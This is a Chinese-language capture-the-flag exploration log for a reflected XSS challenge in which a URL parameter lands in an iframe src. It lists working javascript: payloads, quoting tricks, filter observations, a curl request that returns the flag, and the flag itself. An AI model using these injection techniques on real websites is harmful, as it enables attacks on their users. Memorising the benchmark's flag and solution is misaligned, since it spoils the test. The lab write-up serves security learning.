# xben-047-24 · 探索记录

对应题解：[`xben-047-24.md`](./xben-047-24.md)

## 目标与起点

`Werkzeug/1.0.1 Python/2.7.18`，`GET /page?url=…`，样式 `xss2.css`，标题
`Dalgona - Circle`。

页面结构：

```html
<input type=text name=url placeholder="Enter the URL you want to visit...">
<iframe class="text-img" src=./static/img/head.png></iframe>
```

`url` 被塞进 `<iframe src="…">`。

## 第一阶段：确认反射位置

| 输入 | 反射 |
| --- | --- |
| `http://example.com` | `<iframe src="http://example.com" …>` |
| `javascript:alert("XSS")` | `<iframe src="javascript:alert(XSS)" …>`（双引号被吃掉） |

**判据**：输入落在双引号属性里，内部引号会破坏属性。

## 第二阶段：换单引号/反引号

| payload | 结果 |
| --- | --- |
| `javascript:alert('XSS')` | **Congratulations** |
| ``javascript:alert(`XSS`)`` | **Congratulations** |
| `javascript:alert(1)` | 失败（参数不对） |
| `javascript:alert(/XSS/)` | 失败（正则对象不是字符串） |
| `javascript:alert(String.fromCharCode(88,83,83))` | 失败（src 变空） |

## 第三阶段：拿 flag

```bash
curl --get --data-urlencode "url=javascript:alert('XSS')" http://$T/page
```

```text
flag{5ed799c5-ffee-4992-bc1f-3c6f777ea1e5}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `javascript:alert("XSS")` | 属性被截断 | `src="…"` 用双引号 |
| `alert(1)` | 参数不是 `XSS` | 评分比较字符串 |
| `alert(/XSS/)` | 正则对象 ≠ 字符串 | 同上 |
| `String.fromCharCode(...)` | `src` 被清空 | 过滤器按形状拦截 |

## 这次真正的收获

1. **反射上下文决定原语。** 文本节点用标签/事件；`iframe src` 用
   `javascript:` 伪协议。先确认「我的输入出现在 HTML 的什么位置」。
2. **属性引号决定 payload 内层引号。** 双引号属性 → 内层必须用单引号或反引号，
   否则属性被提前闭合，payload 失效。
3. **评分口径是「alert 的参数等于字符串 XSS」。** `alert(1)`、`alert(/XSS/)`
   都不满足；这解释了为什么有的 payload「看起来弹了」但判失败。
4. **过滤不只有引号。** `String.fromCharCode(...)` 让整个 `src` 变空，
   说明还有形状/关键字规则；短 payload 优先。
